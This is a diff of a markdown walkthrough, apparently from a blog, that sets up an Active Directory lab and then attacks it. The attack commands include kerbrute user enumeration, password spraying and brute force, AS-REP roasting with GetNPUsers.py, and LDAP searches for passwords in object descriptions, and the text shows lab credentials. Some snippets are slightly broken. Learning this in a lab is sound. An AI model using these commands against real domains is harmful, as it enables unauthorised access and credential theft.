@@ -38,12 +38,12 @@ You will need to download the following:
 
 2. Install *VMware Installer Tool* <br>
     <span class="text-muted">(should be located in `D:` Drive)</span>
-    ```ps
+    ```pwsh
     .\setup64.exe
     ```
 3. Install *Active Directory Domain Services*
 
-    ```ps
+    ```pwsh
     Install-WindowsFeature AD-Domain-Services -IncludeManagementTools
     ```
 
@@ -51,7 +51,7 @@ You will need to download the following:
 This allows you to manage the server remotely from your workstation.
     - On workstation, run the following in `powershell`
     
-     ```s
+     ```pwsh
      # Start WinRM service
      Start-Sevice WinRM
 
@@ -70,14 +70,14 @@ This allows you to manage the server remotely from your workstation.
 
 
 5. Promote Server to **Domain Controller**
-    ```ps
+    ```pwsh
     Import-Module ADDSDeployment
     Install-ADDSForest
     ```
 
     You will be prompted to enter a domain name and an administrator password. The server will restart automatically after promotion.
 6. Join Workstation to the Domain
-    ```s
+    ```pwsh
     # check current network interfaces
     Get-DnsClientServerAddress
 
@@ -94,7 +94,7 @@ This allows you to manage the server remotely from your workstation.
 
 With PowerShell Remoting already configured on both machines, we can establish a remote session from the workstation to the server.
 
-```ps
+```pwsh
 dc = New-PSSession "SERVER_IP" -Credential (Get-Credential);
 Enter-PSSession $dc;
 ```
@@ -498,7 +498,7 @@ print(f"[+] Generated {len(usernames)} usernames → {output_file}")
 
 
 We can determine if a *username* exist using `kerbrute` and our `usernames.txt`. It will return all the valid username.
-```s
+```bash
 kerbrute userenum -d "DOMAIN.NAME" --dc "SERVER_IP" "usernames.txt"
 ```
 
@@ -514,9 +514,9 @@ Once we have one or many usernames, we can either do **Password Spraying** or **
 #### Password Spraying
 Testing password on *multiple* users  
 
-```
+```bash
 kerbrute passwordspray -d "DOMAIN.NAME" --dc "SERVER_IP" valid_usernames.txt Password123 
-// or
+# or
 nxc smb "SERVER_IP" -u valid_usernames.txt -p 'Changeme123!' --continue-on-success
 ```
 
@@ -532,7 +532,7 @@ Some usual cases for default password can be
 #### Brute Force 
 Testing *multiple* password on a user
 
- ```sh
+ ```bash
 kerbrute bruteuser -d "DOMAIN.NAME" --dc "SERVER_IP" rockyou.txt "USERNAME.HERE"
  ```
 
@@ -581,7 +581,7 @@ AS-REP roasting exploits Kerberos accounts with **pre-authentication disabled** 
  First we use `GetNPUsers.py` to identify any accounts with **Pre-Auth Disabled** and retreive its relative hashes <br>
  <span class="text-muted">(save it to `hashes.asreproast` file)</span>
 
- ```s
+ ```pwsh
  GetNPUsers.py DOMAIN.NAME/ -usersfile valid_usernames.txt -format hashcat -dc-ip "SERVER_IP" -outputfile hashes.asreproast
  ```
 
@@ -614,7 +614,7 @@ In my case, I used :
 
 #### Password in object description
 we can use `ldap` to search password in object's description (`-w` is password)  think of it just like a *powershell*
-```sh
+```pwsh
 ldapsearch -LLL -H ldap://192.168.181.156 -D 'sherri.marigold@bouncy.local' -w fuck -b 'dc=bouncy,dc=local' "(&(objectClass=user)(description=*))" "samaccountname" "description"
 ```
 
@@ -623,7 +623,7 @@ From there we got 2 accounts,
 - `christalle.robina` : `%2A-G[Do-f2;`
 
 we can test it by :
-```shell
+```pwsh
 ldapwhoami -H ldap://SERVER_IP -D 'samaria.shauna@bouncy.local' -w 'W4tx(-HoG3-?'
 
 # and
